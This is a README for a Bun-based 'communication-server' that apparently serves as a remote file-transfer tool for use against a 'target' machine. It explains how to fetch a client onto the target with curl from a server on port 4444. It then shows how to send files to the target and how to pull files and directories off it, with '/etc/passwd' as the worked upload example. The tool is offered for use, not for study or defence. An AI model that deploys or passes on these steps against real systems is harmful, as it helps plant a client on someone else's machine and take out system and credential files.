# communication-server

### Usage

Clone this repo

Set .env

- PORT : ex: 4444
- ADDR : your hostname ex: https://my-host.com:4444
- ACCESS_KEY : a security key for securing your server change it!

expose your port a way or another

make sure you installed Bun. https://bun.sh

Run

```Bash
#!/usr/bin/env bash
bun i
bun build:client
bun serve
```

from target upload the client from https://my-host:4444/client

```Bash
#!/usr/bin/env bash
curl --output client https://my-host:4444/client
```

then add it to the targets's path

```bash
#!/usr/bin/env bash
 export PATH="some/path:$PATH"
```

## Show help

```bash
#!/usr/bin/env bash
client --help
```

## Send a file to the target

put the file in the **download** directory on the server directory ex: download/the-file.txt

```bash
#!/usr/bin/env bash
client --download the-file.txt
```

it will be outputed in the current directory with the same name

## Get a file or a directory from the target to the server

```bash
#!/usr/bin/env bash
client --upload /etc/passwd
# OR
client --upload /some/directory
```

it will be outputed in the upload/{hour}:{minute}-{random-2-string} directory of the server
